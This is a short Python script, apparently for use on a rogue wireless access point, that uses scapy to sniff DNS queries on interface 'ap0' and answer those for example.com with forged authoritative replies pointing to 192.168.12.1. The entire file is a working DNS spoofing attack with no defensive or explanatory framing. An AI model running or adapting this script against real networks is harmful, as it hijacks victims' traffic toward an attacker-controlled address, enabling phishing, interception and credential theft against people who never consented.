#!/usr/bin/python
from scapy.all import *

hosts = {
    b"example.com."
}
redirect_to = '192.168.12.1'

def sniff_packets():
    sniff(filter="port 53", prn=process_packet, iface='ap0', store=False)

def process_packet(pkt):
    if pkt.haslayer(DNSQR):
        if pkt[DNSQR].qname not in hosts:
            return
        print("[Req]:", pkt.summary())
        res = IP(dst=pkt[IP].src, src=pkt[IP].dst)/ \
            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/ \
            DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
            an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=123, rdata=redirect_to))
        print("[Res]:", res.summary())
        send(res)
if __name__ == '__main__':
    sniff_packets()
